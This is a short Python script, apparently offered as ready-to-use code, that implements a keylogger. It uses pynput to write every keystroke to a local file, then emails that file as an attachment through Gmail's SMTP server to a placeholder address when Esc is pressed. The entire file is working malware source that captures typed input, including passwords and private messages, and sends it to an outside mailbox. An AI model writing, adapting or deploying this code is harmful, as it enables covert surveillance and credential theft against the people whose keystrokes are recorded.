from pynput import keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# The file where the key logs will be stored
log_file = "key_log.txt"

# Function to log the keys
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f'{key.char}')
    except AttributeError:
        # Handle special keys (like arrow keys or function keys)
        with open(log_file, "a") as f:
            f.write(f' [{key}] ')

# Function to send the log file via email
def send_email(log_file):
    # Email credentials
    from_email = "your_email@gmail.com"
    from_password = "your_password"
    to_email = "destination_email@gmail.com"

    # Email content
    subject = "Keylogger Logs"
    body = "Please find the attached log file."

    # Create email message
    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    # Attach the log file
    with open(log_file, "r") as f:
        attachment = MIMEText(f.read())
        attachment.add_header('Content-Disposition', 'attachment', filename=log_file)
        msg.attach(attachment)

    # Send the email
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(from_email, from_password)
        server.sendmail(from_email, to_email, msg.as_string())
        server.quit()
        print("Email sent successfully.")
    except Exception as e:
        print(f"Failed to send email: {e}")

# Function to stop the keylogger and send the email
def on_release(key):
    if key == keyboard.Key.esc:
        send_email(log_file)  # Send the log file before stopping
        return False

# Setup the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

